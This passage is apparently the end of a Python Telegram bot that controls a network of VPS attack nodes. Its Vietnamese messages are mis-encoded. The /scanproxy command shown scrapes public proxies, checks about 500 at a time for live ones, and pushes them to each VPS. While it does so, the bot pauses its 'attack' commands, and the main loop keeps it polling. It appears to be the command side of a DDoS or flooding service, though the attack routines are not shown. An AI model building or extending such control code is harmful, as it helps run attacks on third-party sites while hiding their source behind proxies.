        except Exception as e:
            logging.error(f"L·ªói khi c·∫≠p nh·∫≠t proxy tr√™n VPS {vps['id']}: {str(e)}")
    
    safe_reply(message, f"<b>Th√†nh c√¥ng</b> ‚úÖ\nƒê√£ c·∫≠p nh·∫≠t {len(proxies)} proxy m·ªõi tr√™n {success_count}/{len(VPS_SERVERS)} VPS (x√≥a proxy c≈©).")

@bot.message_handler(commands=["scanproxy"])
def cmd_scanproxy(message):
    """Scan proxy s·ªëng t·ª´ ngu·ªìn v√† c·∫≠p nh·∫≠t, t·∫°m d·ª´ng t·∫•n c√¥ng."""
    if not is_owner(message.from_user.id):
        safe_reply(message, "<b>Truy c·∫≠p b·ªã t·ª´ ch·ªëi</b> üö´\nL·ªánh n√†y ch·ªâ d√†nh cho ch·ªß s·ªü h·ªØu.")
        return
    
    global scanning_proxies
    if scanning_proxies:
        safe_reply(message, "<b>Th√¥ng b√°o</b> ‚ö†Ô∏è\nƒêang scan proxy r·ªìi!")
        return
    
    scanning_proxies = True
    safe_reply(message, "<b>B·∫Øt ƒë·∫ßu scan</b> ‚öôÔ∏è\nBot s·∫Ω t·∫°m d·ª´ng nh·∫≠n l·ªánh t·∫•n c√¥ng trong v√≤ng 10p. ƒêang l·∫•y v√† ki·ªÉm tra proxy...")

    def scan_and_update():
        sources = load_proxy_sources()
        if not sources:
            safe_reply(message, "<b>L·ªói</b> ‚ùå\nKh√¥ng t√¨m th·∫•y ngu·ªìn proxy trong api.txt.")
            scanning_proxies = False
            return
        
        proxies = fetch_proxies_from_sources(sources)
        if not proxies:
            safe_reply(message, "<b>L·ªói</b> ‚ùå\nKh√¥ng th·ªÉ l·∫•y proxy t·ª´ b·∫•t k·ª≥ ngu·ªìn n√†o.")
            scanning_proxies = False
            return
        
        # Scan proxy s·ªëng v·ªõi multithreading ƒë·ªÉ nhanh
        alive_proxies = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=500) as executor:  # S·ªë lu·ªìng cao ƒë·ªÉ scan nhanh
            future_to_proxy = {executor.submit(check_proxy, proxy): proxy for proxy in proxies}
            for future in concurrent.futures.as_completed(future_to_proxy):
                if future.result():
                    alive_proxies.append(future_to_proxy[future])
        
        if not alive_proxies:
            safe_reply(message, "<b>L·ªói</b> ‚ùå\nKh√¥ng c√≥ proxy s·ªëng n√†o.")
            scanning_proxies = False
            return
        
        success_count = 0
        for vps in VPS_SERVERS:
            update_url = vps["url"].replace("/execute", "/update_proxies")
            try:
                response = requests.post(update_url, json={"proxies": alive_proxies}, timeout=10)
                if response.status_code == 200:
                    success_count += 1
                    logging.info(f"ƒê√£ c·∫≠p nh·∫≠t {len(alive_proxies)} proxy s·ªëng tr√™n VPS {vps['id']}.")
                else:
                    logging.error(f"L·ªói c·∫≠p nh·∫≠t proxy tr√™n VPS {vps['id']}: {response.text}")
            except Exception as e:
                logging.error(f"L·ªói khi c·∫≠p nh·∫≠t proxy tr√™n VPS {vps['id']}: {str(e)}")
        
        safe_reply(message, f"<b>Scan ho√†n t·∫•t</b> ‚úÖ\nS·ªë l∆∞·ª£ng proxy s·ªëng: {len(alive_proxies)}\nƒê√£ c·∫≠p nh·∫≠t tr√™n {success_count}/{len(VPS_SERVERS)} VPS (x√≥a proxy c≈©). Bot c√≥ th·ªÉ nh·∫≠n l·ªánh t·∫•n c√¥ng l·∫°i.")
        scanning_proxies = False

    Thread(target=scan_and_update).start()

# ===================== V√≤ng l·∫∑p ch√≠nh =====================
def main():
    """H√†m ch√≠nh ƒë·ªÉ kh·ªüi ƒë·ªông bot."""
    if not TOKEN or OWNER_ID == 0:
        logging.error("Vui l√≤ng thi·∫øt l·∫≠p BOT_TOKEN v√† BOT_OWNER_ID (trong bi·∫øn m√¥i tr∆∞·ªùng ho·∫∑c m√£ ngu·ªìn).")
    if not VPS_SERVERS:
        logging.error("Vui l√≤ng c·∫•u h√¨nh VPS_SERVERS v·ªõi √≠t nh·∫•t m·ªôt endpoint VPS.")
    logging.info("%s ƒëang kh·ªüi ƒë·ªông‚Ä¶", BOT_NAME)
    
    # Ki·ªÉm tra file proxy.txt tr√™n VPS
    ensure_proxy_file_exists()
    
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=40)
        except Exception as e:
            logging.error("L·ªói polling: %s ‚Äî kh·ªüi ƒë·ªông l·∫°i sau 5 gi√¢y", e)
            time.sleep(5)

if __name__ == "__main__":
    main()